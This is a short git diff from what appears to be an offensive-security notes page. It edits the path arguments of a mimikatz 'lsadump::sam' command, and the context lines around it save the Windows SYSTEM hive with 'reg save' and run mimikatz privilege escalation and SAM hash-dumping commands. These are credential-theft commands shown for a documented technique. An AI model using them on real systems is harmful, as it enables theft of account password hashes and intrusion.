@@ -13,10 +13,11 @@ reg save HKLM\SYSTEM SystemBkup.hiv
 mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::SAM /SAM:C:\Users\b3v1l\Desktop\SAM /SYSTEM:C:\Users\b3v1l\Desktop\SYSTEM
+
 ```
 
 ```csharp
-lsadump::sam /system:C:\Users\b3v1l\Documents\test\sam\system /sam:C:\Users\b3v1l\Documents\test\sam\sam
+lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 ```
 
 ![](../../../.gitbook/assets/image%20%28309%29.png)
